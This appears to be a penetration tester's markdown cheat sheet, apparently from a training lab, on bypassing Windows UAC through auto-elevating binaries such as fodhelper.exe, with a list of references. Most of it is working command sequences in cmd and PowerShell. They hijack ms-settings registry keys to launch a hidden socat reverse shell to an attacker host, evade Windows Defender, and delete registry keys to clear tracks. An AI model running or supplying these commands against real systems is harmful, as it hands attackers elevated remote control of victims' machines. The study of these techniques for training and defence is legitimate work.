## Meterpreter
- post/windows/gather/win_privs
- bypassuac
- search bypassuac

## Automated exploitation
https://github.com/hfiref0x/UACME

#### UACME-Akagi64.exe

`Usage: UACME-Akagi64.exe [Method] [Optional Parameteres to Execute]`

Methods

	33 	fodhelper.exe
	34 	DiskCleanup scheduled task
	70 	fodhelper.exe using CurVer registry key

## Auto elevates

For an application, some requirements need to be met to auto-elevate:
- The executable must be signed by the Windows Publisher
- The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/

Depending on the type of application, additional requirements may apply:
- Executable files (.exe) must declare the autoElevate element inside their manifests. To check a file's manifest, we can use sigcheck, a tool provided as part of the Sysinternals suite.
### Auto Elevates examples
- **msconfig** (Tools -> Command Prompt)
- **azman.msc** (Help -> Help Topics -> View Source -> Open -> Find CMD -> Right Click -> Open)
- **fodhelper.exe**
- **mmc.exe** will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.
- Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes **pkgmgr.exe** and **spinstall.exe**, for example.
- COM objects can also request auto-elevation by configuring some registry keys (https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker).

#### FodHelper
```
kali@kali $ nc -lvp 4444

C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
C:\> reg add %REG_KEY% /d %CMD% /f

C:\> fodhelper.exe

C:\> reg delete HKCU\Software\Classes\ms-settings\ /f #Clear tracks
```

##### Bypass Windows Defender 1

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

C:\> reg delete HKCU\Software\Classes\ms-settings\ /f #Clear tracks
```

##### Bypass Windows Defender 2
**CMD**
```
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

C:\> fodhelper.exe

C:\> reg delete "HKCU\Software\Classes\.thm\" /f
C:\> reg delete "HKCU\Software\Classes\ms-settings\" /f
```

**Powershell**
```
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Always Notifty bypass

Check [[Disk Cleanup]]

## Other Techniques

Should you be interested in learning more techniques, the following resources are available:

- UACME github repository (https://github.com/hfiref0x/UACME)
- Bypassing UAC with mock folders and DLL hijacking (https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
- UAC bypass techniques detection strategies 
- Reading your way around UAC (https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)